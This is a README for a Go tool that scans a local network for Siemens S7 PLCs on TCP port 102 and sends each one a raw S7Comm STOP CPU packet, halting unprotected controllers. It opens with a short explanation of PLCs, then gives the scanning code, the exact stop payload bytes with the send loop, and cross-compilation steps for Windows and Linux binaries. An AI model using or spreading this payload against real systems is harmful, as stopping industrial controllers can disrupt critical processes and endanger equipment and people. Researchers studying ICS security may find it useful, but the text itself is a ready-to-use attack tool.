# :wrestling: SIMATIC-SMACKDOWN:

A simple and compact program targeting SIMATIC S7 Programmable Logic Controllers (PLCs) written in Go. Allowing for cross-compilation to target multiple operating systems out of the box, SIMATIC-SMACKDOWN enumerates networks for S7 devices before launching a distributed attack to STOP PLC CPUs.

<p align="center">
  <img width="700" height="450" alt="PXCM" src="https://user-images.githubusercontent.com/72598486/204815532-a523b140-0d63-404d-b3bf-25443b6fac7b.jpg">
</p>

# What are Siemens S7 Programmable Logic Controllers?

SIMATIC is a series of programmable logic controller and automation systems developed by Siemens. The series has gone through four major generations, the latest being the SIMATIC S7 generation. These PLCs are small industrial computers with modular components designed to automate customized control processes. To understand a PLC system, it is best to breakdown the system into two primary parts: the **central processing unit (CPU)** and the **input/output (I/O)** interface system.


![image](https://user-images.githubusercontent.com/72598486/204818575-0b552158-01e0-47fe-9c44-0a07faca07e1.png)


The **central processing unit** contains memory and a communication system needed to instruct the PLC on how to perform. Hence, the reason why CPUs are the “brain” of programmable logic controllers. This is also where data processing and diagnostics take place. The communication system allows the CPU to communicate with other devices such as I/O devices, programming devices, and other PLC systems.

**Input/output (I/O)** modules relay the necessary information to the CPU and communicate the required task in a continuous loop. Input and output devices can either be digital or analog form: digital devices are finite values represented in values of 1 or 0, analog devices are infinite values, and measure ranges of currents or voltages. Inputs or providers are switches, sensors, and smart devices in analog or digital forms. Outputs can be motor starters, lights, valves, and smart devices.

The automation process can be seen in the image below:

![image](https://user-images.githubusercontent.com/72598486/204818074-ac112340-df1f-451f-b11d-7a4bd7e3f149.png)

But what if we could send a signal to turn off the CPU so that communication between the device and the operator could not occur?

# How SIMATIC-SMACKDOWN Works:

SIMATIC-SMACKDOWN operates in three phases: interface enumeration, PLC scanning, and STOP PLC CPU.

The first phase of the program enumerates local network interfaces, gathering information about the host's environment:

```go
	// Get Private Interface
    for _, address := range addrs {
        // only add non loopback IPv4 addresses
        ipnet, ok := address.(*net.IPNet)
        if ok && ipnet.IP.To4() != nil && !ipnet.IP.IsLoopback() {
			var ip_addr = ipnet.IP
            return ip_addr.String()
        }
	}
	return ""
  ```
  
After determining the private IP address, the program enumerates the subnet for devices listening on TCP 102, which is defined as ISO-TSAP Transport Service Access Point) Class 0 protocol and utilized by Siemens S7Comm communications.

```go
	// Connect to device ports
	for i := range ip_list {
    	target := ip_list[i] + ":102"
    	conn, err := net.DialTimeout("tcp", target, 1 * time.Second)
    	if err != nil {
			continue
		} else {
			scanned_ips = append(scanned_ips, ip_list[i])
		}
		conn.Close()
	}
	return scanned_ips
```
Once the program identifies the PLCs, SIMATIC-SMACKDOWN launches a STOP CPU command via raw data to the controller. If the device is not password protected, it will turn off the PLC's CPU and stop operations. This functionality has only been tested on an S7-1200.

```go
	// Connect to device ports
	stop := "\x03\x00\x00\x21\x02\xf0\x80\x32\x01\x00\x00\x06\x00\x00\x10\x00\x00\x29\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d"
	for i := range scanned_ips {
    	target := scanned_ips[i] + ":102"
    	conn, err := net.Dial("tcp", target)
    	if err != nil {
			continue
		} else {
			_, err = conn.Write([]byte(stop))
		}
		conn.Close()
	}
```

# Install: 

Download the repository:

```
$ mkdir SIMATIC-SMACKDOWN
$ cd SIMATIC-SMACKDOWN/
$ sudo git clone https://github.com/RoseSecurity/SIMATIC-SMACKDOWN.git
```

Install Go by finding the appropriate package for your OS at ```https://go.dev/dl/```. You can also download the installer file via ```wget```:

```
$ # wget https://dl.google.com/go/go1.13.5.linux-amd64.tar.gz
# Extract tarball and profit
$ sudo tar -C /usr/local/ -xzf go1.13.5.linux-amd64.tar.gz
```

Or Ubuntu install using ```apt```

``` 
$ sudo apt install golang-go
```

Build Binaries:

```
# Compile for Windows AMD64
$ env GOOS=windows GOARCH=amd64 go build simatic_smackdown.go

# NOTE: The previously compiled binary will contain symbol table and debugging information. To avoid this, use the following:
$ env GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" simatic_smackdown.go

# Compile for Linux AMD64
$ env GOOS=linux GOARCH=amd64 go build simatic_smackdown.go
```
